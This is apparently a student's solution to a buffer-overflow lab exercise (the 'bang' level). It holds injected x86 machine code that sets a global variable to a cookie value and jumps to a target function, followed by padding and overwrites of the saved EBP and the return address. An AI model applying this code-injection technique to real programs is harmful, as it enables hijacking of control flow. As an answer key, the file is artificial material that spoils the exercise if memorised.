/* buf:           0x5568b0b2 */
/* global_value:  0x804d198 */
/* bang:          0x080494af */
/* cookie:        0x77fe0719 */

/* code in buf */
c7 05 98 d1 04 08 19 07 fe 77   /* movl   $0x77fe0719,0x804d198 */
68 af 94 04 08                  /* push   $0x80494af */
c3                              /* ret */
30 30 30 30
30 30 30 30
30 30 30 30
30 30 30 30

30 30 30 30
30 30 30 30
30 30 30 30
30 30 30 30
30 30 30 30
30 30 30 30
30 30 30 30
30 30
/* overflow: EBP */
b2 b0 68 55 
/* overflow: return address */
b2 b0 68 55 
